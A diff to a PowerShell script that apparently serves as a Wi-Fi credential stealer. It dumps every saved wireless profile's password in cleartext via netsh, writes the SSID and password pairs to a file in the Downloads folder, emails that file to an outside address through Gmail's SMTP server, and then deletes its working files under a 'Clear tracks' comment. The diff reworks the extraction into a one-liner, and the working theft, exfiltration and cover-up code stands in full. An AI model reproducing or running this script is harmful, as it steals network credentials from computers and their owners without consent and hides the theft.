@@ -1,18 +1,12 @@
-# All the necessary files will be saved in the following directory
+# All the necessary files will be saved in the following directory. It is always better to use Download folder as the current user has access to right the data to Download folder.
 $p = "$HOME\Downloads\wifipass"
 mkdir $p
 cd $p
 
 # Get all saved wifi password
-netsh wlan export profile key=clear
-dir *.xml |% {
-$xml=[xml] (get-content $_)
-$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
-Out-File wifipass.txt -Append -InputObject $a
-}
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > wifipass.txt
 
-
-# --------Email the output file---------
+# Email the output file
 # Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
 $FROM = "Your email "
 $PASS = "password for the email"
@@ -24,10 +18,9 @@ $BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the at
 $ATTACH = "wifipass.txt"
 
 Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
-# --- End email------------------------
+# End email
 
 # Clear tracks
-rm *.xml
 rm *.txt
 cd ..
 rm wifipass
